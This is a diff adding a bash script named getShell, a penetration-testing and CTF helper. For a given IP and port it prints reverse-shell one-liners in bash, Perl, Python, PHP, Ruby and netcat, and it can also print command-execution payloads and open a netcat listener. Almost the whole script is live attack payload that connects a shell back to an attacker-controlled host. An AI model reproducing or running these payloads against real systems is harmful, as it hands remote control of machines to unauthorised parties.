@@ -1,0 +1,201 @@
+#!/bin/bash
+
+# Version 1
+
+#### COLORS ####
+
+RED="\e[1;31m"
+YELLOW="\e[43m"
+GREEN="\e[1;32m"
+BLUE="\e[46m"
+WHITE="\e[37m"
+PURPLE="\e[1;35m"
+ENDCOLOR="\e[0m"
+
+#### FUNCTIONS ####
+
+printBanner()
+{
+	echo '
+                 __    _________/\            __   __   
+   ____   ____ _/  |_ /   _____/  |__   ____ |  | |  |  
+  / ___\_/ __ \\   __\\_____  \|  |  \_/ __ \|  | |  |  
+ / /_/  \  ___/_|  |  /        \      \  ___/_  |__  |__
+ \___  / \___  /|__| /_______  /___|  /\___  /____/____/
+/_____/      \/              \/     \/     \/           
+
+	Version: 1.0 		Author: focab0r
+'
+}
+
+printHelp()
+{
+	echo '
+	Usage:  getShell -i [IP] [PORT]
+		getShell [COMMAND]
+
+	OPTIONS:
+	  -i   -->  Specify IP and PORT
+	  -v   -->  Open a listening port using netcat
+	  -t   -->  List interfaces
+	  -p   -->  Send a ping to github.com 
+	  Else -->  Specify a command
+		  
+	EXAMPLES:
+	  getShell -i 10.10.15.46 9443
+	  getShell -v 9443
+	  getShell cat /tmp/flag.txt
+	'
+}
+
+#### SHELLs ####
+
+bashShell()
+{
+	echo -e "\n${BLUE}### BASH ###${ENDCOLOR}"
+	echo -e "${YELLOW}[1]${ENDCOLOR} bash -i >& /dev/tcp/${GREEN}$1${ENDCOLOR}/${PURPLE}$2${ENDCOLOR} 0>&1"
+	echo -e "${YELLOW}[2]${ENDCOLOR} /bin/bash -l > /dev/tcp/${GREEN}$1${ENDCOLOR}/${PURPLE}$2${ENDCOLOR} 0<&1 2>&1"
+}
+
+perlShell()
+{
+	echo -e "\n${BLUE}### PERL ###${ENDCOLOR}"
+	echo -e  "${YELLOW}[1]${ENDCOLOR} perl -e 'use Socket;\$i=\"${GREEN}$1${ENDCOLOR}\";\$p=${PURPLE}$2${ENDCOLOR};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+}
+
+pyShell()
+{
+	echo -e "\n${BLUE}### PYTHON ###${ENDCOLOR}"
+	echo -e "${YELLOW}[1]${ENDCOLOR} export RHOST=\"${GREEN}$1${ENDCOLOR}\";export RPORT=${PURPLE}$2${ENDCOLOR};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
+	echo -e "${YELLOW}[2]${ENDCOLOR} python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${GREEN}$1${ENDCOLOR}\",${PURPLE}$2${ENDCOLOR}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
+	echo -e "${YELLOW}[3]${ENDCOLOR} python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${GREEN}$1${ENDCOLOR}\",${PURPLE}$2${ENDCOLOR}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+}
+
+phpShell()
+{
+	echo -e "\n${BLUE}### PHP ###${ENDCOLOR}"
+	echo -e "${YELLOW}[1]${ENDCOLOR} php -r '\$sock=fsockopen(\"${GREEN}$1${ENDCOLOR}\",${PURPLE}$2${ENDCOLOR});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+	echo -e "${YELLOW}[2]${ENDCOLOR} <?php system(\"bash -i >& /dev/tcp/${GREEN}$1${ENDCOLOR}/${PURPLE}$2${ENDCOLOR} 0>&1\") ?>"
+	echo -e "${YELLOW}[3]${ENDCOLOR} <?php system(\"/bin/bash -l > /dev/tcp/${GREEN}$1${ENDCOLOR}/${PURPLE}$2${ENDCOLOR} 0<&1 2>&1\") ?>"
+}
+
+rubyShell()
+{
+	echo -e "\n${BLUE}### RUBY ###${ENDCOLOR}"
+	echo -e "${YELLOW}[1]${ENDCOLOR} ruby -rsocket -e'f=TCPSocket.open(\"${GREEN}$1${ENDCOLOR}\",${PURPLE}$2${ENDCOLOR}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+}
+
+ncShell()
+{
+	echo -e "\n${BLUE}### Netcat ###${ENDCOLOR}"
+	echo -e "${YELLOW}[1]${ENDCOLOR} nc -e /bin/sh ${GREEN}$1${ENDCOLOR} ${PURPLE}$2${ENDCOLOR}"
+	echo -e "${YELLOW}[2]${ENDCOLOR} rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${GREEN}$1${ENDCOLOR} ${PURPLE}$2${ENDCOLOR} >/tmp/f"
+}
+
+listShells()
+{
+	IPs=$1
+	PORTs=$2
+        bashShell $IPs $PORTs
+        perlShell $IPs $PORTs
+        pyShell $IPs $PORTs
+        phpShell $IPs $PORTs
+        rubyShell $IPs $PORTs
+	ncShell $IPs $PORTs
+
+}
+
+#### COMMANDS ####
+
+perlCommand()
+{
+	echo -e "\n${BLUE}### PERL ###${ENDCOLOR}"
+	echo -e "${YELLOW}[1]${ENDCOLOR} perl -e 'exec \"${RED}$@${ENDCOLOR}\";'"
+}
+
+pyCommand()
+{
+	echo -e "\n${BLUE}### PYTHON ###${ENDCOLOR}"
+	echo -e "${YELLOW}[1]${ENDCOLOR} python -c 'import os; os.system(\"${RED}$@${ENDCOLOR}\")'"
+	echo -e "${YELLOW}[2]${ENDCOLOR} python3 -c 'import os; os.system(\"${RED}$@${ENDCOLOR}\")'"
+}
+
+phpCommand()
+{
+	echo -e "\n${BLUE}### PHP ###${ENDCOLOR}"
+	echo -e "${YELLOW}[1]${ENDCOLOR} php -r 'system(\"${RED}$@${ENDCOLOR}\");'"
+	echo -e "${YELLOW}[2]${ENDCOLOR} <?php system(\"${RED}$@${ENDCOLOR}\") ?>"
+}
+
+rubyCommand()
+{
+        echo -e "\n${BLUE}### RUBY ###${ENDCOLOR}"
+        echo -e "${YELLOW}[1]${ENDCOLOR} ruby -e 'exec \"${RED}$@${ENDCOLOR}\"'"
+}
+
+listCommands()
+{
+	COMMANDs=$@
+	perlCommand $COMMANDs
+	pyCommand $COMMANDs
+	phpCommand $COMMANDs
+	rubyCommand $COMMANDs
+}
+
+#### PROGRAM ####
+
+if [ $# == 0 ];
+then
+	printBanner
+	printHelp
+	echo -e "[*] ERROR: Specify at least one argument\n"
+	exit 1
+fi
+
+if [ "$1" == '-h' ];
+then
+	printBanner
+	printHelp
+elif [ "$1" == '-v' ];
+then
+	PORT=$2
+	if [ "$PORT" != '' ];
+	then	
+		nc -nlvp $PORT
+	else
+		printBanner
+		printHelp
+		echo -e "[*] ERROR: Specify a port to open\n"
+		exit 1
+	fi
+elif [ "$1" == '-i' ];
+then
+	IP=$2
+	PORT=$3
+	listShells $IP $PORT
+elif [ "$1" == '-t' ];
+then
+	echo -e "\n${BLUE}### INTERFACES ###${ENDCOLOR}\n"
+	for value in `ifconfig | grep flags | awk '{print $1}' FS=':' | sort -u | grep -v "br" | grep -v "docker" | grep -v "veth"`
+	do
+		IP=$(ifconfig | grep $value -A 1 | grep inet | awk '{print $2}' FS="inet " | awk '{print $1}' FS=" ")
+		echo -e "$value --> ${GREEN}$IP${ENDCOLOR}"
+	done
+	echo -e ""
+	exit 0
+elif [ "$1" == '-p' ];
+then
+	if [ "$(ping -c 1 github.com 2> /dev/null | grep "0%")" == '' ];
+	then
+		echo -e "${RED}\n[*] You don't have Internet connection!\n${ENDCOLOR}"
+	else
+		echo -e "${GREEN}\n[*] You have Internet connection!\n${ENDCOLOR}"
+	fi
+	exit 0
+else
+	COMMAND=$@
+	listCommands $COMMAND
+fi
+
+echo -e "\n"
+exit 0
